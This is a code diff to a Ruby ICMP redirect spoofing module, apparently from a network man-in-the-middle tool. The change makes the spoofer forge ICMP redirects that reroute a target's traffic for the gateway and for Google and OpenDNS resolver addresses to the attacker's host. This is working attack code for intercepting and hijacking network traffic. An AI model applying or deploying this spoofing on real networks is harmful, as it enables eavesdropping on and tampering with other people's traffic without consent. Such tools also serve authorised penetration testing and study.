@@ -84,9 +84,11 @@ class Icmp < Base
     @ctx          = Context.get
     @forwarding   = @ctx.firewall.forwarding_enabled?
     @gateway      = nil
-    @address      = @ctx.ifconfig[:ip_saddr]
+    @local        = @ctx.ifconfig[:ip_saddr]
     @spoof_thread = nil
     @running      = false
+    @entries      = [ '8.8.8.8', '8.8.4.4',                # Google DNS
+                      '208.67.222.222', '208.67.220.220' ] # OpenDNS
 
     Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."
 
@@ -98,13 +100,16 @@ class Icmp < Base
     Logger.info "  #{@gateway}"
   end
 
-  # Send an ICMP redirect to the target identified by the +target+ IP address.
+  # Send ICMP redirect to the +target+, redirecting the gateway ip and
+  # everything in the @entries list of addresses to us.
   def send_spoofed_packet( target )
-    Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} ..."
+    ( [@gateway.ip] + @entries ).each do |address|
+      Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} redirecting #{address} to us ..."
 
-    pkt = ICMPRedirectPacket.new
-    pkt.update!( @gateway, target, @address, @gateway.ip )
-    pkt.to_w(@ctx.ifconfig[:iface])
+      pkt = ICMPRedirectPacket.new
+      pkt.update!( @gateway, target, @local, address )
+      pkt.to_w(@ctx.ifconfig[:iface])
+    end
   end
 
   # Start the ICMP redirect spoofing.
